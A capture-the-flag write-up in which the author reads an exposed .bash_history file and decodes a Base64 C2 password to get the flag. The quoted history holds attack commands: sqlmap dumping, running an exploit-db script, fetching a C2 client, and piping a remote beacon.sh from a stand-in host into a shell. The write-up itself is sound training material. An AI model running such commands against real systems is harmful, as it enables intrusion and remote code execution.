# Frontier Exposed

## Objective

Analyze the exposed server files to uncover sensitive information and retrieve the flag.

---

## Initial Recon

The challenge provided the URL `http://83.136.254.158:43705/`, which hosts a number of files accessible via HTTP:

- `.bash_history`
- `.bash_logout`
- `.bashrc`
- `.profile`
- `dirs.txt`
- `exploit.sh`
- `nmap_scan_results.txt`
- `vulmap-linux.py`

### Enumeration of Files

The first step was to check the contents of `.bash_history`, a file that often contains a list of previously executed shell commands. Using the `curl` command, I retrieved its contents:

```bash
curl http://83.136.254.158:43705/.bash_history
```

### Contents of `.bash_history`

The file revealed a series of commands executed by the user on the system. The commands were as follows:

```plaintext
nmap -sC -sV nmap_scan_results.txt jackcolt.dev
cat nmap_scan_results.txt
gobuster dir -u http://jackcolt.dev -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o dirs.txt
nc -zv jackcolt.dev 1-65535
curl -v http://jackcolt.dev
nikto -h http://jackcolt.dev
sqlmap -u "http://jackcolt.dev/login.php" --batch --dump-all
searchsploit apache 2.4.49
wget https://www.exploit-db.com/download/50383 -O exploit.sh
chmod u+x exploit.sh
echo "http://jackcolt.dev" > target.txt
./exploit target.txt /bin/sh whoami
wget https://notthefrontierboard/c2client -O c2client
chmod +x c2client
/c2client --server 'https://notthefrontierboard' --port 4444 --user admin --password SFRCe0MyX2NyM2QzbnQxNGxzXzN4cDBzM2R9
./exploit target.txt /bin/sh 'curl http://notthefrontierboard/files/beacon.sh|sh'
wget https://raw.githubusercontent.com/vulmon/Vulmap/refs/heads/master/Vulmap-Linux/vulmap-linux.py -O vulnmap-linux.py
cp vulnmap-linux.py /var/www/html
```

---

## Analysis

The commands indicate several reconnaissance and exploitation attempts performed by the user. Notably, one command stood out:

```bash
/c2client --server 'https://notthefrontierboard' --port 4444 --user admin --password SFRCe0MyX2NyM2QzbnQxNGxzXzN4cDBzM2R9
```

Here, a `password` parameter is passed as Base64-encoded text. The password value is:

```
SFRCe0MyX2NyM2QzbnQxNGxzXzN4cDBzM2R9
```

### Decoding the Base64 String

To extract the plaintext password, I used the `base64` decoding command:

```bash
echo "SFRCe0MyX2NyM2QzbnQxNGxzXzN4cDBzM2R9" | base64 --decode
```

This revealed the flag:

```
HTB{C2_cr3d3nt14ls_3xp0s3d}
```

---

## Conclusion

By analyzing the `.bash_history` file, I identified sensitive information, including credentials that were exposed during a command execution, this allowed me to retrieve the flag.

